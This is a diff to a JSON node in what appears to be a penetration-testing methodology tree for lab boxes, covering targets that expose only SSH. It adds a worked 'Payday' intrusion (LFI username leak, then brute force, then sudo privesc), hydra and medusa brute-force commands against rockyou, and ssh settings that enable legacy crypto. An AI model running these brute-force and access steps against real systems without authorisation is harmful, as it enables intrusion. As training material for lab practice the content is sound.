@@ -2,21 +2,21 @@
   "id": "ssh_only",
   "phase": "SSH",
   "title": "SSH Only Exposed",
-  "body": "SSH alone is rarely the initial attack vector. You need creds or a key from somewhere. Check non-standard web ports — something else is almost always running.",
-  "cmd": "# Check non-standard ports\nnmap -p 8000,8080,8443,8888,9000,9090,3000,5000 $ip\n\n# SSH version / algo audit\nssh-audit $ip\n\n# Banner grab\nnc -nv $ip 22\n\n# Username enum (if older OpenSSH)\nssh-user-enum.py -U /opt/SecLists/Usernames/Names/names.txt -t $ip",
-  "warn": "Brute forcing SSH without a targeted username list is almost never the path.",
+  "body": "SSH is almost never the FIRST move - it's a door you walk through AFTER information gathering hands you a key or a username. Treat this node as two ordered steps.\n\nSTEP 1 - INFO GATHERING (do this first, always). A bare SSH port gives you nothing to brute with. Go find a username or credential elsewhere: check non-standard web ports (something is almost always running), enumerate web apps for LFI / config files / source disclosure, hit SMB and the mail services, read /etc/passwd if you have any file-read. SSH brute force without a username pulled from enumeration is a near-guaranteed dead end - don't start here.\n\nSTEP 2 - BRUTE FORCE (only once Step 1 gave you a username). When enumeration hands you a real user (e.g. patrick from an LFI /etc/passwd read), brute that single user against a common wordlist - that's frequently the whole foothold. Two things bite you on old boxes: (1) legacy crypto - modern SSH clients refuse to negotiate the server's old algorithms; fix it once in ~/.ssh/config and every ssh-based tool inherits it. (2) hydra's bundled libssh often CAN'T negotiate legacy crypto at all - it dies with 'kex error: no match for method mac' and no flag fixes it. medusa speaks old SSH where hydra can't - switch tools, don't fight flags.\n\nWorked example (Payday): nmap showed only SSH plus a web app -> enumerated the web app -> CS-Cart LFI leaked the username patrick -> THEN brute: hydra failed on the MAC negotiation, medusa cracked patrick:patrick -> sudo -l revealed passwordless sudo -> root. The brute force only worked because info gathering produced the username first.",
+  "cmd": "# ── First: is SSH really the only thing? ──\nnmap -p 8000,8080,8443,8888,9000,9090,3000,5000 $ip   # non-standard web\nssh-audit $ip                                          # version / algo audit\nnc -nv $ip 22                                          # banner grab\n\n# ══════════════════════════════════════════════════\n# LEGACY CRYPTO FIX (old SSH daemons — kex/mac/host-key errors)\n# ══════════════════════════════════════════════════\n# Error looks like:\n#   Unable to negotiate ... no matching host key type found. Their offer: ssh-rsa,ssh-dss\n#   kex error : no match for method mac algo ... server [hmac-md5,hmac-sha1,...]\n# Set the legacy algorithms once; every ssh-based tool inherits this:\ncat >> ~/.ssh/config << 'EOF'\n\nHost <TARGET_IP>\n    HostKeyAlgorithms +ssh-rsa,ssh-dss\n    PubkeyAcceptedKeyTypes +ssh-rsa\n    KexAlgorithms +diffie-hellman-group1-sha1,diffie-hellman-group14-sha1\n    MACs +hmac-sha1,hmac-md5\n    Ciphers +aes256-cbc,aes128-cbc,3des-cbc\nEOF\n\n# Verify a manual connect negotiates (a password prompt = crypto works):\nssh patrick@$ip\n# One-shot without editing config (note the SPACE after -o, + appends to defaults):\nssh -o HostKeyAlgorithms=+ssh-rsa -o KexAlgorithms=+diffie-hellman-group14-sha1 \\\n    -o MACs=+hmac-sha1,hmac-md5 -o Ciphers=+aes256-cbc patrick@$ip\n# Diagnose which algo is failing:\nssh -v patrick@$ip 2>&1 | grep -iE 'kex|cipher|host key|mac'\n\n# ══════════════════════════════════════════════════\n# BRUTE FORCE  <-- ONLY after info gathering gave you a username.\n#                  No username = go back and enumerate, do not brute blind.\n# ==================================================\n# ══════════════════════════════════════════════════\n# medusa — negotiates legacy crypto well; the one that works on old boxes:\nmedusa -h $ip -u patrick -P /usr/share/wordlists/rockyou.txt -M ssh -t 4\n#   -h host  -u user  -P passlist  -M ssh  -t threads (keep low, old sshd drops conns)\n\n# hydra — fine on MODERN ssh; will die on legacy-crypto boxes (libssh can't negotiate):\nhydra -l patrick -P /usr/share/wordlists/rockyou.txt ssh://$ip -t 4\n#   if you see 'kex error: no match for method mac' -> hydra can't do this box, use medusa\n\n# Lab passwords usually sit high in rockyou — try the top slice first for speed:\nhead -10000 /usr/share/wordlists/rockyou.txt > top.txt\nmedusa -h $ip -u patrick -P top.txt -M ssh -t 4\n\n# ══════════════════════════════════════════════════\n# AFTER YOU'RE IN — first move every time\n# ══════════════════════════════════════════════════\nsudo -l        # sudo misconfig is a top Linux privesc path (it was the root path on Payday)\nid; whoami; hostname",
+  "warn": "Brute forcing SSH without a targeted username is almost never the path — get a username from enumeration first (LFI, web, config). If hydra throws 'kex error: no match for method mac', that's libssh refusing legacy crypto — no hydra flag fixes it, switch to medusa. Keep brute threads low (-t 4); old SSH daemons drop connections under load and throw false negatives.",
   "choices": [
     {
-      "label": "Found web on non-standard port",
+      "label": "No username yet — enumerate web/services FIRST",
       "next": "web_enum"
     },
     {
-      "label": "Got creds from elsewhere — SSH in",
-      "next": "linux_post_exploit"
+      "label": "Got SSH key from enumeration",
+      "next": "ssh_key"
     },
     {
-      "label": "Got SSH key",
-      "next": "ssh_key"
+      "label": "Have creds (found or brute-cracked) — SSH in & privesc",
+      "next": "linux_post_exploit"
     }
   ]
 }
